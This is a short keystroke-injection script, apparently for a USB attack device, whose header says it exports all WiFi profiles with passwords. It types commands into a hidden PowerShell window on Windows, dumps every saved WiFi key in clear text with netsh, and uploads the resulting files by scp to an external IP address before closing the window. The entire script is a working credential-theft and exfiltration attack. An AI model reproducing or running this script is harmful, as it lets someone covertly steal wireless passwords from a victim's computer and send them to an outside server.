/* Script to export all WiFi-profiles with passwords into xml-files
Author: M.H.
*/
function fast() {
  typingSpeed(0,0)
}
typingSpeed(100,150);
press("WIN R");
delay(500);
type("powershell.exe -windowstyle hidden");
delay(500);
press("ENTER");
delay(500);
type("mkdir WLan");
delay(500);
press("ENTER");
delay(500)
type("cd Wlan");
press("ENTER");
delay(500);
fast();
type("netsh wlan export profile key=clear");
delay(500);
press("ENTER");
delay(2000);
type("set var=%cd%");
delay(500);
press("ENTER");
delay(500);
type("scp -r %var% jarvis@72.14.177.48:");
delay(500);
press("ENTER");
delay(3000);
press("ALT F4");
